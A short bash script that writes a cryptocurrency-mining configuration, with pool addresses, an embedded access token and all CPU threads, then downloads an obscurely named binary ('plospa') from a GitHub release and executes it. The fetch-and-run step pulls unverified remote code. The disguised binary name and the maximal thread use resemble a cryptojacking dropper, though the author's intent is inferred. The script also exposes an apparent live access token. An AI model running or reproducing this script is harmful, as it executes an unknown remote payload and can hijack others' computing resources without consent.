#!/bin/bash

THREADS=$(nproc --all)
WORKER_NAME="SEP$(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 5 | head -n 1)"

cat <<EOF > appsettings.json
{
  "ClientSettings": {
    "poolAddress": "wss://pplnsjetski.xyz/ws/YEFTEEAYTSMKIDPBMGCTIDOZTKCBBGYTGANZMCLGTFWWARKYZGKZZSBBJOQN",
    "alias": "$WORKER_NAME",
    "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImZiZDRlODYyLTkxZWEtNDM1NS04YzFlLTA5Y2M2MmQwNjA2MiIsIk1pbmluZyI6IiIsIm5iZiI6MTc1NTcxMTY2MiwiZXhwIjoxNzg3MjQ3NjYyLCJpYXQiOjE3NTU3MTE2NjIsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.qPA6YWsSenUztyObsghbeePK28zNQ7iY3kazWsk9fJgegbcMo58SLal5Q1ytzPxfaMZIyLhActlzxjBT3G4mwayrzAiyh9IDqXh4CUWNQ54W1LPCzv-uQPuyjy8HNr7qJUFDI-fl54kBXBXGbkCfvghvkX0eP5w1pD0WAmpGTbUmCyead2U3NGDbs2a6DrdRi86uFVp8Pxzg_cwVuFuKFhJx5oVitBCIPPcYSSDz8m9l2C6B1icvwTWGXJnchlOIJ12cjFXpkq_DHhp_M4lWwpMpJGGsl1YKWQ22OrpVheJZM22z-rsgQ4RU3LVbGU1BoY3ssOFmtCnzIE_D5ekATg",
    "qubicAddress": null,
    "displayDetailedHashrates": true,
    "pps": true,
    "xmrSettings": {
      "disable": false,
      "enableGpu": false,
      "poolAddress": "69.164.205.212:8086",
      "amountOfThreads": $THREADS,
      "customParameters": ""
    }
  }
}
EOF

echo "✅ Config generated with alias $WORKER_NAME and $THREADS threads."

echo "⬇️  Downloading plospa..."
wget -q https://github.com/vedhagsvp/taberas/releases/download/latest/plospa -O plospa

chmod +x plospa
echo "🚀 Running plospa..."
file ./plospa
./plospa || echo "❌ Failed to run plospa"
